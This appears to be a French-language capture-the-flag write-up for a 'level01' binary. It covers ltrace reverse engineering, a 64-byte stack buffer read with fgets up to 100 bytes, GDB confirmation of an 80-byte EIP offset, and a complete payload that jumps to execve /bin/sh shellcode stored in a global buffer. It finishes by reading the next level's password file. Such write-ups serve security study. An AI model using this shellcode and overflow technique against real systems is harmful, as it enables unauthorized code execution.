@@ -1,0 +1,90 @@
+# Analyse du binaire level01
+
+## 1. Observation et Reverse Engineering
+En analysant le code source reconstruit et en utilisant ltrace, nous observons le comportement suivant :
+- Le programme demande un "Username".
+- Le programme demande un "Password".
+
+L'analyse via `ltrace` révèle des informations critiques sur la mémoire :
+$> ltrace ./level01
+fgets("dat_wil\n", 256, ...) = 0x0804a040
+fgets("admin\n", 100, ...)   = 0xffffd6ec
+
+### Points clés identifiés :
+1. **Variable Username (Global)** : Le buffer du nom d'utilisateur est stocké à l'adresse fixe `0x0804a040` (dans la section .bss/.data). Il fait 256 octets.
+2. **Variable Password (Stack)** : Le buffer du mot de passe est sur la stack.
+3. **La Faille** : Le programme alloue 64 octets pour le buffer password (`char[64]`), mais `fgets` lit jusqu'à 100 octets.
+   -> Il y a un **Buffer Overflow** possible de 36 octets (100 - 64).
+
+## 2. Stratégie d'Exploitation
+Puisque nous contrôlons le buffer du Username et que son adresse est fixe (`0x0804a040`), c'est l'endroit idéal pour stocker notre Shellcode.
+Nous allons utiliser le débordement dans le Password pour écraser l'EIP (Instruction Pointer) et le rediriger vers notre Shellcode stocké dans le Username.
+
+### Étape 1 : Préparation du Username (Le conteneur du Shellcode)
+Le programme vérifie que le username commence par "dat_wil".
+Notre payload pour le username sera :
+`dat_wil` + [Shellcode]
+
+Calcul de l'adresse du shellcode :
+Adresse de base Username : 0x0804a040
+Longueur de "dat_wil"     : 7 octets
+Adresse cible             : 0x0804a040 + 7 = 0x0804a047
+
+### Étape 2 : Calcul théorique de l'Offset et Alignement
+Nous devons déterminer la distance exacte pour atteindre l'EIP.
+
+**Calcul détaillé (Pourquoi 80 octets ?) :**
+Contrairement à une idée reçue, l'écart n'est pas fixe. Le compilateur (GCC) aligne la stack sur des multiples de 16 octets pour la performance.
+1. **Buffer** : 64 octets.
+2. **Saved EBP** : 4 octets.
+3. **Total brut** : 68 octets.
+4. **Alignement** : Le multiple de 16 supérieur à 68 est **80** (16 * 5).
+5. **Conséquence** : Le compilateur ajoute 12 octets de "padding" (vide) pour aller de 68 à 80.
+
+*L'offset final est donc de 80 octets. Si le buffer avait une taille différente, ce padding changerait.*
+
+---
+
+## (Bonus) Vérification précise de la taille via GDB
+
+Pour ne pas se baser uniquement sur la théorie, nous validons l'offset exact en analysant le crash mémoire avec **GDB**.
+
+**1. Création d'un Pattern (Motif)**
+Nous générons une suite logique de caractères (AAAABBBBCCCC...) pour identifier précisément quelle partie de la chaîne écrase l'EIP.
+$> python -c "print 'dat_wil'; print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV'" > /tmp/pattern
+
+**2. Exécution dans GDB**
+$> gdb ./level01
+(gdb) run < /tmp/pattern
+
+**3. Analyse du Crash**
+Le programme s'arrête sur une erreur de segmentation.
+Program received signal SIGSEGV, Segmentation fault.
+0x55555555 in ?? ()
+
+**4. Interprétation**
+* La valeur `0x55555555` correspond à la suite ASCII **"UUUU"**.
+* Dans notre alphabet, **U** est la 21ème lettre.
+* Il y a donc 20 groupes de 4 lettres avant le crash.
+* Calcul : 20 * 4 = 80.
+
+L'offset est donc confirmé à **80 octets** exacts.
+
+---
+
+## 3. Implémentation
+
+### Le Shellcode
+Nous utilisons un shellcode classique de 21 octets pour exécuter /bin/sh :
+\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
+
+### La commande finale (Python)
+Nous utilisons Python pour générer les caractères non-imprimables et l'adresse en Little Endian (`\x47\xa0\x04\x08`).
+Nous chaînons la commande avec `cat` pour garder le shell ouvert via stdin.
+
+Payload complet :
+(python -c "print 'dat_wil' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'; print 'A'*80 + '\x47\xa0\x04\x08'"; cat) | ./level01
+
+## 4. Résolution
+Une fois la commande exécutée, nous obtenons un shell avec les droits de level02.
+$> cat /home/users/level02/.pass
